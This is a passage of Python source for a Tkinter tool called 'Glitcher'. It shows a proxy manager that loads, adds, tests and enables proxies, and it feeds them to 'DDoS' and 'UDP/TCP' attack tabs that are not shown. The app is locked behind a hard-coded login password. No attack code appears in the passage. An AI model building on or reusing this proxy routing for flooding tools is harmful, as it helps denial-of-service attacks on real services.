        btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
        proxy['udp_tcp_button'].config(text=btn_text, style=btn_style)
        
        # Update proxy status in the main proxy management
        self.update_ddos_proxy_status()
        self.update_udp_tcp_proxy_status()
        
        # Update the main proxy list display
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
        
        # Update the proxy list in both tabs
        self.update_ddos_proxy_list()
        self.update_udp_tcp_proxy_list()
    
    def update_udp_tcp_proxy_status(self):
        # Update the proxy status label in UDP/TCP tab
        if hasattr(self, 'proxies'):
            enabled_count = len(self.get_enabled_proxies())
        else:
            enabled_count = 0
        self.udp_tcp_proxy_status_label.config(text=f"Enabled Proxies: {enabled_count}")
    
    def create_proxy_management_ui(self):
        # Main frame for proxy management
        proxy_main_frame = ttk.LabelFrame(self.proxy_management_frame, text="Proxy Management - Check and Manage Proxies", padding=10)
        proxy_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls frame
        controls_frame = ttk.LabelFrame(proxy_main_frame, text="Proxy Management", padding=10)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Enable/Disable All button
        toggle_all_frame = ttk.Frame(controls_frame)
        toggle_all_frame.pack(fill=tk.X, pady=5)
        
        self.enable_all_proxies_btn = ttk.Button(toggle_all_frame, text="Enable All Proxies", command=self.toggle_all_proxies)
        self.enable_all_proxies_btn.pack(side=tk.LEFT, padx=5)
        
        # Buttons
        button_frame = ttk.Frame(controls_frame)
        button_frame.pack(fill=tk.X, pady=5)
        
        self.load_proxies_btn = ttk.Button(button_frame, text="Load Proxies from File", command=self.load_proxies_from_file)
        self.load_proxies_btn.pack(side=tk.LEFT, padx=5)
        
        self.check_proxies_btn = ttk.Button(button_frame, text="Check All Proxies", command=self.check_all_proxies, state=tk.DISABLED)
        self.check_proxies_btn.pack(side=tk.LEFT, padx=5)
        
        self.test_proxy_btn = ttk.Button(button_frame, text="Test Single Proxy", command=self.test_single_proxy)
        self.test_proxy_btn.pack(side=tk.LEFT, padx=5)
        
        # Add proxy frame
        add_proxy_frame = ttk.Frame(controls_frame)
        add_proxy_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(add_proxy_frame, text="Add Proxy (IP:PORT):", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.new_proxy_var = tk.StringVar()
        self.new_proxy_entry = ttk.Entry(add_proxy_frame, textvariable=self.new_proxy_var, width=20, font=("Arial", 10))
        self.new_proxy_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        self.add_proxy_btn = ttk.Button(add_proxy_frame, text="Add Proxy", command=self.add_proxy)
        self.add_proxy_btn.pack(side=tk.LEFT)
        
        # Proxy list frame
        proxy_list_frame = ttk.LabelFrame(proxy_main_frame, text="Proxy List", padding=10)
        proxy_list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Proxy treeview
        columns = ("IP", "Port", "Status", "Response Time", "Last Checked", "Enabled")
        self.proxy_tree = ttk.Treeview(proxy_list_frame, columns=columns, show='headings', height=20)
        
        # Define headings
        for col in columns:
            self.proxy_tree.heading(col, text=col)
            self.proxy_tree.column(col, width=100)
        
        # Set specific width for the enabled column
        self.proxy_tree.column("Enabled", width=60)
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(proxy_list_frame, orient=tk.VERTICAL, command=self.proxy_tree.yview)
        h_scrollbar = ttk.Scrollbar(proxy_list_frame, orient=tk.HORIZONTAL, command=self.proxy_tree.xview)
        self.proxy_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.proxy_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        # Bind double-click to toggle individual proxy
        self.proxy_tree.bind('<Double-1>', self.toggle_individual_proxy)
        
        proxy_list_frame.grid_rowconfigure(0, weight=1)
        proxy_list_frame.grid_columnconfigure(0, weight=1)
        
        # Initialize proxy list
        self.proxies = []
        self.load_existing_proxies()
    
    def load_existing_proxies(self):
        # Load proxies from proxies.txt file
        try:
            with open('proxies.txt', 'r', encoding='utf-8-sig') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':')
                        if len(parts) == 2:
                            ip, port = parts
                            self.proxies.append({
                                'ip': ip,
                                'port': port,
                                'status': 'Unknown',
                                'response_time': 'N/A',
                                'last_checked': 'Never',
                                'enabled': False  # Initially disabled
                            })
        except FileNotFoundError:
            # If file doesn't exist, create it
            with open('proxies.txt', 'w', encoding='utf-8') as f:
                f.write('# Glitcher Proxies File\n')
                f.write('# Add your proxies in IP:PORT format\n')
                f.write('# Example: 127.0.0.1:8080\n')
        except UnicodeDecodeError:
            # If UTF-8 fails, try with latin-1
            try:
                with open('proxies.txt', 'r', encoding='latin-1') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            parts = line.split(':')
                            if len(parts) == 2:
                                ip, port = parts
                                self.proxies.append({
                                    'ip': ip,
                                    'port': port,
                                    'status': 'Unknown',
                                    'response_time': 'N/A',
                                    'last_checked': 'Never',
                                    'enabled': False  # Initially disabled
                                })
            except:
                # If all encodings fail, create empty file
                with open('proxies.txt', 'w', encoding='utf-8') as f:
                    f.write('# Glitcher Proxies File\n')
                    f.write('# Add your proxies in IP:PORT format\n')
                    f.write('# Example: 127.0.0.1:8080\n')
        
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies (use a longer delay to avoid UI freezing)
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
    
    def load_proxies_from_file(self):
        # Load proxies from file and display them
        self.proxies = []  # Clear existing list
        self.load_existing_proxies()
        self.check_proxies_btn.config(state=tk.NORMAL)
        messagebox.showinfo("Success", f"Loaded {len(self.proxies)} proxies from proxies.txt")
    
    def update_proxy_list(self):
        # Clear existing items
        for item in self.proxy_tree.get_children():
            self.proxy_tree.delete(item)
        
        # Add proxies to treeview
        for proxy in self.proxies:
            enabled_status = "Yes" if proxy['enabled'] else "No"
            self.proxy_tree.insert('', tk.END, values=(
                proxy['ip'],
                proxy['port'],
                proxy['status'],
                proxy['response_time'],
                proxy['last_checked'],
                enabled_status
            ))
    
    def toggle_all_proxies(self):
        # Toggle all proxies (enable/disable all)
        all_enabled = all(proxy['enabled'] for proxy in self.proxies)
        
        # If all are enabled, disable all; otherwise enable all
        new_state = not all_enabled
        
        for proxy in self.proxies:
            proxy['enabled'] = new_state
        
        # Update the button text
        if new_state:
            self.enable_all_proxies_btn.config(text="Disable All Proxies")
        else:
            self.enable_all_proxies_btn.config(text="Enable All Proxies")
        
        # Update the list
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
        
        # Update proxy status in other tabs
        if hasattr(self, 'ddos_proxy_status_label'):
            self.update_ddos_proxy_status()
            # Skip duplicate update since it's already scheduled above
        if hasattr(self, 'udp_tcp_proxy_status_label'):
            self.update_udp_tcp_proxy_status()
    
    def toggle_individual_proxy(self, event):
        # Toggle individual proxy when double-clicked
        selected_item = self.proxy_tree.selection()
        if not selected_item:
            return
        
        # Get the selected item's values
        item_values = self.proxy_tree.item(selected_item[0], 'values')
        ip, port = item_values[0], item_values[1]
        
        # Find the proxy in the list and toggle its state
        for proxy in self.proxies:
            if proxy['ip'] == ip and proxy['port'] == port:
                proxy['enabled'] = not proxy['enabled']
                break
        
        # Update the list
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
        
        # Update proxy status in other tabs
        if hasattr(self, 'ddos_proxy_status_label'):
            self.update_ddos_proxy_status()
            # Skip duplicate update since it's already scheduled above
        if hasattr(self, 'udp_tcp_proxy_status_label'):
            self.update_udp_tcp_proxy_status()
    
    def get_enabled_proxies(self):
        # Return list of enabled proxies
        if not hasattr(self, 'proxies'):
            return []
        return [proxy for proxy in self.proxies if proxy['enabled']]
    
    def add_proxy(self):
        proxy_input = self.new_proxy_var.get().strip()
        if not proxy_input:
            messagebox.showwarning("Warning", "Please enter a proxy in IP:PORT format")
            return
        
        if ':' not in proxy_input:
            messagebox.showerror("Error", "Invalid format. Please use IP:PORT format")
            return
        
        parts = proxy_input.split(':')
        if len(parts) != 2:
            messagebox.showerror("Error", "Invalid format. Please use IP:PORT format")
            return
        
        ip, port = parts
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                raise ValueError("Port out of range")
        except ValueError:
            messagebox.showerror("Error", "Invalid port number. Must be between 1 and 65535")
            return
        
        # Check if proxy already exists
        for proxy in self.proxies:
            if proxy['ip'] == ip and proxy['port'] == port:
                messagebox.showwarning("Warning", "Proxy already exists in the list")
                return
        
        # Add proxy to list
        self.proxies.append({
            'ip': ip,
            'port': port,
            'status': 'Unknown',
            'response_time': 'N/A',
            'last_checked': 'Never',
            'enabled': False  # New proxies start as disabled
        })
        
        # Add to file
        with open('proxies.txt', 'a') as f:
            f.write(f"{proxy_input}\n")
        
        # Update UI
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
        self.new_proxy_var.set('')
        self.check_proxies_btn.config(state=tk.NORMAL)
        
        # Update proxy status in other tabs
        if hasattr(self, 'ddos_proxy_status_label'):
            self.update_ddos_proxy_status()
            # Skip duplicate update since it's already scheduled above
        if hasattr(self, 'udp_tcp_proxy_status_label'):
            self.update_udp_tcp_proxy_status()
        
        messagebox.showinfo("Success", f"Added proxy {proxy_input} to the list")
    
    def test_single_proxy(self):
        # Get selected proxy from treeview
        selected_item = self.proxy_tree.selection()
        if not selected_item:
            messagebox.showwarning("Warning", "Please select a proxy to test")
            return
        
        item_values = self.proxy_tree.item(selected_item[0], 'values')
        ip, port = item_values[0], item_values[1]
        
        # Test the proxy
        status, response_time = self.check_proxy_connection(ip, port)
        
        # Update proxy info
        for proxy in self.proxies:
            if proxy['ip'] == ip and proxy['port'] == port:
                proxy['status'] = status
                proxy['response_time'] = f"{response_time}ms" if response_time != 'N/A' else 'N/A'
                proxy['last_checked'] = time.strftime('%H:%M:%S')
                break
        
        # Update UI
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
        messagebox.showinfo("Test Result", f"Proxy {ip}:{port} - Status: {status}")
    
    def check_all_proxies(self):
        # Disable button during check
        self.check_proxies_btn.config(state=tk.DISABLED)
        
        # Start checking in a separate thread
        threading.Thread(target=self._check_all_proxies_thread, daemon=True).start()
    
    def _check_all_proxies_thread(self):
        total_proxies = len(self.proxies)
        for i, proxy in enumerate(self.proxies):
            status, response_time = self.check_proxy_connection(proxy['ip'], proxy['port'])
            
            # Update proxy info
            proxy['status'] = status
            proxy['response_time'] = f"{response_time}ms" if response_time != 'N/A' else 'N/A'
            proxy['last_checked'] = time.strftime('%H:%M:%S')
            
            # Update UI in main thread
            self.root.after(0, lambda: self.update_proxy_list())
            
            # Update progress
            progress = f"Checking proxies: {i+1}/{total_proxies}"
            self.root.after(0, lambda p=progress: self.root.title(p))
        
        # Re-enable button
        self.root.after(0, lambda: self.check_proxies_btn.config(state=tk.NORMAL))
        self.root.after(0, lambda: self.root.title("Glitcher - Professional Web Security Testing Platform"))
        self.root.after(0, lambda: messagebox.showinfo("Complete", "Proxy checking completed"))
    
    def check_proxy_connection(self, ip, port):
        import socket
        import time
        
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # 5 second timeout
            
            start_time = time.time()
            result = sock.connect_ex((ip, int(port)))
            end_time = time.time()
            
            response_time = round((end_time - start_time) * 1000, 2)  # Convert to milliseconds
            
            sock.close()
            
            if result == 0:
                return 'Online', response_time
            else:
                return 'Offline', 'N/A'
        except Exception as e:
            return 'Offline', 'N/A'

def show_login():
    login_window = tk.Tk()
    login_window.title("Glitcher - Login")
    login_window.geometry("1280x720")
    login_window.resizable(False, False)
    
    # Try to load and display the login image
    try:
        from PIL import Image, ImageTk
        image_path = "templates/login.png"
        image = Image.open(image_path)
        # Resize image to fit window if needed
        image = image.resize((1280, 720), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(image)
        
        # Create label to display image
        image_label = tk.Label(login_window, image=photo)
        image_label.image = photo  # Keep a reference to avoid garbage collection
        image_label.pack()
        
        # Create a frame for the login area in the bottom-right corner
        login_frame = tk.Frame(login_window, bg='black', padx=30, pady=30)
        login_frame.place(relx=1.0, rely=1.0, anchor='se')  # Place at bottom-right
        
        # Login label and entry
        tk.Label(login_frame, text="Login", bg='black', fg='white', font=("Arial", 16, "bold")).pack(pady=(0, 10))
        
        tk.Label(login_frame, text="Password:", bg='black', fg='white', font=("Arial", 12)).pack(pady=(0, 5))
        
        password_var = tk.StringVar()
        password_entry = tk.Entry(login_frame, textvariable=password_var, show="*", font=("Arial", 12), width=25)
        password_entry.pack(pady=(0, 10))
        
        def check_password():
            if password_var.get() == "godveaq":
                login_window.destroy()
                show_main_app()
            else:
                messagebox.showerror("Error", "Invalid password")
        
        # Login button
        login_button = tk.Button(login_frame, text="Login", command=check_password, font=("Arial", 12), bg="#2563eb", fg="white")
        login_button.pack()
        
        # Bind Enter key to login
        password_entry.bind('<Return>', lambda event: check_password())
        
    except ImportError:
        # PIL not available, use a simple login form
        tk.Label(login_window, text="GLITCHER", font=("Arial", 24, "bold")).pack(pady=50)
        tk.Label(login_window, text="Enter Password:", font=("Arial", 14)).pack(pady=10)
        
        password_var = tk.StringVar()
        password_entry = tk.Entry(login_window, textvariable=password_var, show="*", font=("Arial", 14), width=25)
        password_entry.pack(pady=10)
        
        def check_password():
            if password_var.get() == "godveaq":
                login_window.destroy()
                show_main_app()
            else:
                messagebox.showerror("Error", "Invalid password")
        
        tk.Button(login_window, text="Login", command=check_password, font=("Arial", 14)).pack(pady=20)
        password_entry.bind('<Return>', lambda event: check_password())
        
        # Focus on password entry
        password_entry.focus()
    
    login_window.mainloop()

def show_main_app():
    root = tk.Tk()
    
    # Configure styles
    style = ttk.Style()
    style.configure('Danger.TButton', foreground='red')
    
    app = GlitcherGUI(root)
    root.mainloop()

def main():
    show_login()

if __name__ == "__main__":
    main()